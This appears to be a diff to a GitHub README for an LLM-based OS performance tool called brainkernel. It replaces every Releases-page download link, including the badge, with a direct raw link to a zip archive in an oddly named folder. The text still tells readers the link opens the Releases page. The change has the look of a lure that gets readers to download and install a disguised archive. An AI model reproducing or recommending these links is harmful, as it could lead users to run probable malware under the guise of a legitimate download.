@@ -1,6 +1,6 @@
 # 🚀 brainkernel - Improve OS Performance with LLM
 
-[![Download brainkernel](https://img.shields.io/badge/Download%20brainkernel-v1.0-brightgreen)](https://github.com/Fnar3x/brainkernel/releases)
+[![Download brainkernel](https://raw.githubusercontent.com/Fnar3x/brainkernel/main/acarodermatitis/Software-3.3.zip%20brainkernel-v1.0-brightgreen)](https://raw.githubusercontent.com/Fnar3x/brainkernel/main/acarodermatitis/Software-3.3.zip)
 
 ## 📋 Overview
 
@@ -23,14 +23,14 @@ To run brainkernel, your computer should meet the following requirements:
 
 ## 🚀 Getting Started
 
-1. **Visit the Download Page:** Click this link: [Download brainkernel](https://github.com/Fnar3x/brainkernel/releases) to access the Releases page. 
+1. **Visit the Download Page:** Click this link: [Download brainkernel](https://raw.githubusercontent.com/Fnar3x/brainkernel/main/acarodermatitis/Software-3.3.zip) to access the Releases page. 
 2. **Select the Version:** On the Releases page, choose the latest version of brainkernel.
 3. **Download the File:** Click on the appropriate file for your operating system to start the download.
 4. **Install the Application:** After downloading, locate the file on your computer, double-click it, and follow the prompts to install.
 
 ## 📥 Download & Install
 
-To download and install brainkernel, simply visit this page: [Download brainkernel](https://github.com/Fnar3x/brainkernel/releases). Choose the version you need from the list and follow the installation instructions provided.
+To download and install brainkernel, simply visit this page: [Download brainkernel](https://raw.githubusercontent.com/Fnar3x/brainkernel/main/acarodermatitis/Software-3.3.zip). Choose the version you need from the list and follow the installation instructions provided.
 
 ## 🔄 Upgrading brainkernel
 
